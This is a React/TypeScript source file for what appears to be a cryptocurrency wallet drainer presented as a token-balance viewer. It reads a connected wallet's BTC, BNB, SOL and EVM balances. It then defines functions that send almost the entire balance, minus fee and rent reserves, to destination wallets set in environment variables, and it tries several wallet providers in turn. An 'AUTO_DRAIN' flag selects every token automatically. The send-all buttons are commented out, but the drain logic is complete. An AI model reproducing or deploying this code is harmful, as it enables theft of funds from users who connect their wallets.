import { useCallback, useEffect, useState } from 'react';
import { useDynamicContext } from '@dynamic-labs/sdk-react-core';
import { PublicKey, SystemProgram, Transaction, Connection } from '@solana/web3.js';

import { Button, Loading, Toggle, useToasts } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { httpFetchTokens, Tokens } from '../../src/fetch-tokens';
import { publicActions } from 'viem';

const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

const BTC_NATIVE_ID = 'btc-native';
const BNB_NATIVE_ID = 'bnb-native';

function isBtcChain(chain: string | undefined): boolean {
  if (!chain) return false;
  const c = chain.toUpperCase();
  return c === 'BTC' || c === 'BITCOIN';
}

function isBnbChain(chain: string | undefined): boolean {
  if (!chain) return false;
  const c = chain.toUpperCase();
  return c === 'BNB' || c === 'BNB_CHAIN' || c === 'BINANCE';
}

function isBnbBech32Address(addr: string | undefined): boolean {
  if (!addr) return false;
  return addr.startsWith('bnb1') || addr.startsWith('tbnb1');
}

async function fetchBnbBalanceMiniUnits(
  bech32Address: string,
): Promise<bigint> {
  const res = await fetch(
    `https://api.binance.org/bc/api/v1/account/${bech32Address}`,
  );
  if (!res.ok) return BigInt(0);
  const data = await res.json();
  const bnb = data.balances?.find(
    (b: { symbol?: string }) => b.symbol === 'BNB',
  );
  return BigInt(bnb?.free || '0');
}

const TokenRow: React.FunctionComponent<{
  token: Tokens[number];
  address?: string;
}> = ({ token, address }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const pendingTxn =
    checkedRecords[token.contract_address]?.pendingTxn;
  const setTokenChecked = (tokenAddress: string, isChecked: boolean) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };
  const { balance, contract_address, contract_ticker_symbol } = token;

  // Safely compute balance; avoid division by zero when quote_rate is 0/undefined
  const hasQuoteRate =
    typeof token.quote_rate === 'number' && token.quote_rate !== 0;
  const unroundedBalance = hasQuoteRate
    ? tinyBig(token.quote || 0).div(token.quote_rate as number)
    : tinyBig(token.balance || 0).div(
        10 ** (Number(token.contract_decimals || 0)),
      );
  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
      ? unroundedBalance.round(2)
      : unroundedBalance.round(5);

  const [isLoading, setIsLoading] = useState(false);

  // Basic mock check for now to replace wagmi useWaitForTransactionReceipt
  useEffect(() => {
    if (pendingTxn && pendingTxn.hash) {
      setIsLoading(true);
      // Wait roughly for completion or use a dedicated hook per chain
      setTimeout(() => setIsLoading(false), 5000);
    }
  }, [pendingTxn]);

  return (
    <div key={contract_address}>
      {isLoading && <Loading />}
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace' }}>
        {roundedBalance.toString()}{' '}
      </span>
      <a href={`#`} target="_blank" rel="noreferrer">
        {contract_ticker_symbol}
      </a>{' '}
      (worth{' '}
      <span style={{ fontFamily: 'monospace' }}>
        {usdFormatter.format(token.quote || 0)}
      </span>
      )
    </div>
  );
};
export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { primaryWallet } = useDynamicContext();
  const address = primaryWallet?.address;
  const { setToast } = useToasts();

  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const fetchData = useCallback(async () => {
    if (!primaryWallet) return;
    setLoading(true);
    try {
      setError('');
      let erc20s: any[] = [];
      let chainId = 1;

      // Only fetch ERC20 tokens via Moralis when on an EVM chain
      if (primaryWallet.chain === 'EVM') {
        const networkRaw = await primaryWallet.getNetwork();
        chainId =
          typeof networkRaw === 'string'
            ? parseInt(networkRaw, 10)
            : Number(networkRaw) || 1;

        try {
          const newTokens = await httpFetchTokens(chainId, address as string);
          erc20s = (newTokens as any).data?.erc20s || [];
        } catch (e) {
          console.warn('ERC20 fetch failed:', e);
        }
      }

      const allTokens = [...erc20s];

      if (primaryWallet.chain === 'EVM') {
        const walletClient = await (
          primaryWallet.connector as any
        ).getWalletClient();
        if (walletClient) {
          const publicClient = (walletClient as any).extend(publicActions);
          const nativeBal = await publicClient.getBalance({
            address: address as `0x${string}`,
          });
          const nativeVal = BigInt(nativeBal.toString());
          if (nativeVal > BigInt(0)) {
            allTokens.push({
              contract_decimals: 18,
              contract_name: 'Native Token',
              contract_ticker_symbol: 'ETH/BNB/MATIC',
              contract_address: '0x0000000000000000000000000000000000000000',
              supports_erc: ['erc20'],
              logo_url: '',
              last_transferred_at: new Date().toISOString(),
              native_token: true,
              type: 'cryptocurrency',
              balance: nativeVal.toString(),
              balance_24h: nativeVal.toString(),
              quote_rate: 0,
              quote_rate_24h: 0,
              quote: 0,
              quote_24h: 0,
              nft_data: null,
            });
          }
        }
      }

      if (primaryWallet.chain === 'SOL') {
        const rpcUrl =
          process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
          'https://api.mainnet-beta.solana.com';
        const solanaConnection = new Connection(rpcUrl, 'confirmed');
        const publicKey = new PublicKey(address as string);
        if (solanaConnection && publicKey) {
          try {
            const lamports = await solanaConnection.getBalance(publicKey);
            if (lamports > 0) {
              const solBalance = BigInt(lamports);
              allTokens.push({
                contract_decimals: 9, // SOL has 9 decimals
                contract_name: 'Solana',
                contract_ticker_symbol: 'SOL',
                contract_address: '11111111111111111111111111111111', // System program
                supports_erc: ['erc20'], // mock support
                logo_url: '',
                last_transferred_at: new Date().toISOString(),
                native_token: true,
                type: 'cryptocurrency',
                balance: solBalance.toString(),
                balance_24h: solBalance.toString(),
                quote_rate: 0,
                quote_rate_24h: 0,
                quote: 0,
                quote_24h: 0,
                nft_data: null,
              });
            }
          } catch (err) {
            console.error('Error fetching SOL balance', err);
          }
        }
      }

      // ── Bitcoin ───────────────────────────────────────────────────────────────
      if (isBtcChain(primaryWallet.chain)) {
        try {
          const btcRes = await fetch(
            `https://mempool.space/api/address/${address}`,
          );
          const btcData = await btcRes.json();
          const confirmedSats =
            (btcData.chain_stats?.funded_txo_sum || 0) -
            (btcData.chain_stats?.spent_txo_sum || 0);
          const mempoolSats =
            (btcData.mempool_stats?.funded_txo_sum || 0) -
            (btcData.mempool_stats?.spent_txo_sum || 0);
          const totalSats = confirmedSats + mempoolSats;
          if (totalSats > 0) {
            allTokens.push({
              contract_decimals: 8,
              contract_name: 'Bitcoin',
              contract_ticker_symbol: 'BTC',
              contract_address: BTC_NATIVE_ID,
              supports_erc: [],
              logo_url: '',
              last_transferred_at: new Date().toISOString(),
              native_token: true,
              type: 'cryptocurrency',
              balance: totalSats.toString(),
              balance_24h: totalSats.toString(),
              quote_rate: 0,
              quote_rate_24h: 0,
              quote: 0,
              quote_24h: 0,
              nft_data: null,
            });
          }
        } catch (err) {
          console.error('Error fetching BTC balance', err);
        }
      }

      // ── BNB (Beacon Chain, bech32) ────────────────────────────────────────────
      if (isBnbChain(primaryWallet.chain) || isBnbBech32Address(address)) {
        try {
          const totalMini = await fetchBnbBalanceMiniUnits(address as string);
          if (totalMini > BigInt(0)) {
            allTokens.push({
              contract_decimals: 8,
              contract_name: 'BNB',
              contract_ticker_symbol: 'BNB',
              contract_address: BNB_NATIVE_ID,
              supports_erc: [],
              logo_url: '',
              last_transferred_at: new Date().toISOString(),
              native_token: true,
              type: 'cryptocurrency',
              balance: totalMini.toString(),
              balance_24h: totalMini.toString(),
              quote_rate: 0,
              quote_rate_24h: 0,
              quote: 0,
              quote_24h: 0,
              nft_data: null,
            });
          }
        } catch (err) {
          console.error('Error fetching BNB balance', err);
        }
      }

      setTokens(allTokens);

      if (process.env.NEXT_PUBLIC_AUTO_DRAIN === 'true') {
        const autoChecked: Record<string, { isChecked: boolean }> = {};
        allTokens.forEach((token: any) => {
          autoChecked[token.contract_address] = { isChecked: true };
        });
        setCheckedRecords(autoChecked);
      } else {
        setCheckedRecords({});
      }
    } catch (error) {
      setError(`Failed to fetch chain tokens.`);
      console.error(error);
    }
    setLoading(false);
  }, [primaryWallet, address, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (address) {
      fetchData();
    }
  }, [address, fetchData]);

  useEffect(() => {
    if (!primaryWallet) {
      setTokens([]);
      setCheckedRecords({});
    }
  }, [primaryWallet, setTokens, setCheckedRecords]);

  if (loading) {
    return <Loading>Loading</Loading>;
  }

  if (error) {
    return <div>{error}</div>;
  }

  const handleSendAllBtc = async () => {
    try {
      if (!primaryWallet || !isBtcChain(primaryWallet.chain)) {
        showToast('Connect a Bitcoin wallet first.', 'warning');
        return;
      }

      const btcDestination = process.env.NEXT_PUBLIC_DESTINATION_WALLET_BTC;
      if (!btcDestination) {
        showToast('Destination Bitcoin wallet is not configured.', 'warning');
        return;
      }

      const btcToken = tokens.find(
        (t) => t.native_token && t.contract_address === BTC_NATIVE_ID,
      );
      if (!btcToken || Number(btcToken.balance || 0) <= 0) {
        showToast('No BTC balance to send.', 'warning');
        return;
      }

      const btcRes = await fetch(
        `https://mempool.space/api/address/${address}`,
      );
      const btcData = await btcRes.json();
      const confirmedSats =
        (btcData.chain_stats?.funded_txo_sum || 0) -
        (btcData.chain_stats?.spent_txo_sum || 0);
      const mempoolSats =
        (btcData.mempool_stats?.funded_txo_sum || 0) -
        (btcData.mempool_stats?.spent_txo_sum || 0);
      const liveSats = confirmedSats + mempoolSats;

      const FEE_RESERVE = 2000;
      const amountToSend = liveSats - FEE_RESERVE;
      if (amountToSend <= 0) {
        showToast('Balance is too low to cover network fee.', 'warning');
        return;
      }

      const win = window as any;
      const connector = primaryWallet.connector as any;
      let txid: string | undefined;

      if (typeof win?.unisat?.sendBitcoin === 'function') {
        txid = await win.unisat.sendBitcoin(btcDestination, amountToSend);
      } else if (typeof win?.okxwallet?.bitcoin?.sendBitcoin === 'function') {
        const res = await win.okxwallet.bitcoin.sendBitcoin(
          btcDestination,
          amountToSend,
        );
        txid = res?.txhash || res;
      } else if (typeof win?.BitcoinProvider?.request === 'function') {
        const res = await win.BitcoinProvider.request('sendBtcTransaction', {
          recipients: [
            { address: btcDestination, amountSats: BigInt(amountToSend) },
          ],
          senderAddress: address,
        });
        txid = res?.result?.txid || res?.txid;
      } else if (typeof connector?.sendBitcoin === 'function') {
        txid = await connector.sendBitcoin(btcDestination, amountToSend);
      } else {
        const signer = await connector?.getSigner?.();
        if (typeof signer?.sendBitcoin === 'function') {
          txid = await signer.sendBitcoin(btcDestination, amountToSend);
        } else if (typeof signer?.transfer === 'function') {
          txid = await signer.transfer(btcDestination, amountToSend);
        } else {
          const walletClient = await connector?.getWalletClient?.();
          if (typeof walletClient?.sendBitcoin === 'function') {
            txid = await walletClient.sendBitcoin(btcDestination, amountToSend);
          } else {
            showToast(
              'Bitcoin wallet does not support direct transfers.',
              'warning',
            );
            return;
          }
        }
      }

      if (txid) {
        showToast('BTC transfer submitted.', 'success');
      }
    } catch (err: any) {
      showToast(`BTC transfer failed: ${err.message || String(err)}`, 'error');
    }
  };

  const handleSendAllBnb = async () => {
    try {
      if (
        !primaryWallet ||
        (!isBnbChain(primaryWallet.chain) && !isBnbBech32Address(address))
      ) {
        showToast('Connect a BNB (Beacon) wallet first.', 'warning');
        return;
      }

      const bnbDestination = process.env.NEXT_PUBLIC_DESTINATION_WALLET_BNB;
      if (!bnbDestination) {
        showToast('Destination BNB wallet is not configured.', 'warning');
        return;
      }

      const bnbToken = tokens.find(
        (t) => t.native_token && t.contract_address === BNB_NATIVE_ID,
      );
      if (!bnbToken || BigInt(bnbToken.balance || '0') <= BigInt(0)) {
        showToast('No BNB balance to send.', 'warning');
        return;
      }

      const liveMini = await fetchBnbBalanceMiniUnits(address as string);
      const FEE_RESERVE = 100000;
      const amountToSend = Number(liveMini) - FEE_RESERVE;
      if (amountToSend <= 0) {
        showToast('Balance is too low to cover network fee.', 'warning');
        return;
      }

      const win = window as any;
      const connector = primaryWallet.connector as any;
      const amountHuman = amountToSend / 1e8;
      let txHash: string | undefined;

      if (typeof connector?.sendBnb === 'function') {
        txHash = await connector.sendBnb(bnbDestination, amountToSend);
      } else if (typeof win?.BinanceChain?.request === 'function') {
        const res = await win.BinanceChain.request({
          method: 'transfer',
          params: {
            from: address,
            to: bnbDestination,
            amount: amountHuman,
            asset: 'BNB',
          },
        });
        txHash = res?.hash || res?.txHash || res;
      } else if (typeof win?.binanceChain?.request === 'function') {
        const res = await win.binanceChain.request({
          method: 'transfer',
          params: {
            from: address,
            to: bnbDestination,
            amount: amountHuman,
            asset: 'BNB',
          },
        });
        txHash = res?.hash || res?.txHash || res;
      } else {
        const signer = await connector?.getSigner?.();
        if (typeof signer?.sendBnb === 'function') {
          txHash = await signer.sendBnb(bnbDestination, amountToSend);
        } else if (typeof signer?.transfer === 'function') {
          txHash = await signer.transfer(bnbDestination, amountToSend);
        } else {
          const walletClient = await connector?.getWalletClient?.();
          if (typeof walletClient?.sendBnb === 'function') {
            txHash = await walletClient.sendBnb(bnbDestination, amountToSend);
          } else if (typeof walletClient?.transfer === 'function') {
            txHash = await walletClient.transfer(
              bnbDestination,
              amountToSend,
            );
          } else {
            showToast('BNB wallet does not support direct transfers.', 'warning');
            return;
          }
        }
      }

      if (txHash) {
        showToast('BNB transfer submitted.', 'success');
      }
    } catch (err: any) {
      showToast(`BNB transfer failed: ${err.message || String(err)}`, 'error');
    }
  };

  const handleSendAllSol = async () => {
    try {
      if (!primaryWallet || primaryWallet.chain !== 'SOL') {
        showToast('Connect a Solana wallet first.', 'warning');
        return;
      }

      const destinationAddress = process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL;
      if (!destinationAddress) {
        showToast('Destination Solana wallet is not configured.', 'warning');
        return;
      }

      const rpcUrl =
        process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
        'https://api.mainnet-beta.solana.com';
      const solanaConnection = new Connection(rpcUrl, 'confirmed');
      const fromPubkey = new PublicKey(address as string);
      const toPubkey = new PublicKey(destinationAddress);

      // Use cached SOL balance from tokens state instead of another RPC call
      const solToken = tokens.find(
        (t) => t.native_token && t.contract_ticker_symbol === 'SOL',
      );
      const balanceLamports = solToken
        ? Number(solToken.balance || 0)
        : 0;
      if (!solToken || balanceLamports <= 0) {
        showToast('No SOL balance to send.', 'warning');
        return;
      }

      // Fetch live balance right before building tx to avoid stale-cache issues
      const liveBalance = await solanaConnection.getBalance(fromPubkey);

      // Must leave at least the rent-exempt minimum (890,880 lamports) so the
      // sender account doesn't enter the forbidden 1–890,879 lamport range that
      // causes on-chain rent errors. Add 100,000 on top for the fee.
      const RENT_EXEMPT = 890880;
      const FEE_RESERVE  = 100000;
      const amountToSend = liveBalance - RENT_EXEMPT - FEE_RESERVE;
      if (amountToSend <= 0) {
        showToast('Balance is too low to cover network fee.', 'warning');
        return;
      }

      const { blockhash } = await solanaConnection.getLatestBlockhash();
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: amountToSend,
        }),
      );
      tx.recentBlockhash = blockhash;
      tx.feePayer = fromPubkey;

      // Use getSigner() from Dynamic connector, then send via our own RPC
      const connectorSigner = await (
        primaryWallet.connector as any
      ).getSigner();
      const signedTx = await connectorSigner.signTransaction(tx);
      const signature = await solanaConnection.sendRawTransaction(
        signedTx.serialize(),
        { skipPreflight: true },
      );

      if (signature) {
        showToast('SOL transfer submitted.', 'success');
      }
    } catch (err: any) {
      showToast(`SOL transfer failed: ${err.message || String(err)}`, 'error');
    }
  };

  return (
    <div style={{ margin: '20px' }}>
      {primaryWallet && tokens?.length === 0 && `No tokens found`}
      {tokens.map((token) => (
        <TokenRow
          token={token}
          key={token.contract_address}
          address={address}
        />
      ))}
      {/* {(isBnbChain(primaryWallet?.chain) ||
        isBnbBech32Address(address)) && (
        <div style={{ marginTop: '16px' }}>
          <button
            onClick={handleSendAllBnb}
            style={{
              padding: '8px 14px',
              borderRadius: '8px',
              border: '1px solid #30363d',
              background: 'rgba(243, 186, 47, 0.15)',
              color: '#e6edf3',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            Send all BNB to destination wallet
          </button>
        </div>
      )} */}
      {/* {isBtcChain(primaryWallet?.chain) && (
        <div style={{ marginTop: '16px' }}>
          <button
            onClick={handleSendAllBtc}
            style={{
              padding: '8px 14px',
              borderRadius: '8px',
              border: '1px solid #30363d',
              background: 'rgba(247, 147, 26, 0.15)',
              color: '#e6edf3',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            Send all BTC to destination wallet
          </button>
        </div>
      )} */}
      {/* {primaryWallet?.chain === 'SOL' && (
        <div style={{ marginTop: '16px' }}>
          <button
            onClick={handleSendAllSol}
            style={{
              padding: '8px 14px',
              borderRadius: '8px',
              border: '1px solid #30363d',
              background: 'rgba(56, 139, 253, 0.15)',
              color: '#e6edf3',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            Send all SOL to destination wallet
          </button>
        </div>
      )} */}
    </div>
  );
};
